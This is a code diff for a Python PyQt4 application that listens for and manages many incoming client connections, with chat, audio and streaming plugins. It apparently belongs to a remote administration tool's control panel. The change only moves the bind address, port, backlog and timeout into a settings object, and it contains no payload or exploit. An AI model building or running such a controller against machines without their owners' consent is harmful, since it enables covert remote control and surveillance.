@@ -19,6 +19,7 @@ from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
 from ui import gui
+from settings import Config
 
 from libs.modechat import get, send
 from plugins.maudio import main as maudio
@@ -61,11 +62,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         super(MainDialog, self).__init__(parent)
         self.setupUi(self)
 
-        # sockets Timeout
-        self.timeout = None
+        self.settings = Config()
+
+        # set settings
+        self.IPADDRESS = self.settings.ip_address
+        self.PORT = self.settings.port
+        self.MAXCONNECTIONS = self.settings.max_connections
+        self.TIMEOUT = self.settings.timeout
 
         # update gui
         self.gui = QApplication.processEvents
+
+        self.portLabel.setText(str(self.PORT))
 
         # unlocked servers bank
         self.unlockedSockets = []
@@ -143,7 +151,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.socks = {}
             self.streaming_socks = {}
             self.acceptthreadState = True
-            self.listenthread = Thread(target=self.accept_connections, args=(4434,))
+            self.listenthread = Thread(target=self.accept_connections)
             self.listenthread.setDaemon(True)
             self.listenthread.start()
             self.statusLabel.setText('Listening')
@@ -165,7 +173,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.onlineStatus.setText('0')
             try:
                 self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.shd.connect(('127.0.0.1', 4434))
+                self.shd.connect(('127.0.0.1', self.PORT))
                 self.shd.close()
             except:
                 pass
@@ -176,7 +184,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     # listen for clients
     # accept connections
-    def accept_connections(self, port):
+    def accept_connections(self):
 
         # Initializing socket
         self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -184,10 +192,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         # Bind address
-        self.c.bind(('0.0.0.0', int(port)))
+        self.c.bind((self.IPADDRESS, self.PORT))
 
         # Start listen for connections
-        self.c.listen(128)
+        self.c.listen(self.MAXCONNECTIONS)
 
         # Start Servers Check Thread
         servers_check_start = threading.Thread(target=self.check_servers)
@@ -214,7 +222,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     info = ast.literal_eval(data)
 
                     # Set timeout None
-                    self.sock.settimeout(self.timeout)
+                    self.sock.settimeout(self.TIMEOUT)
 
                     # Save connected socket
                     socket_index = self.address[1]
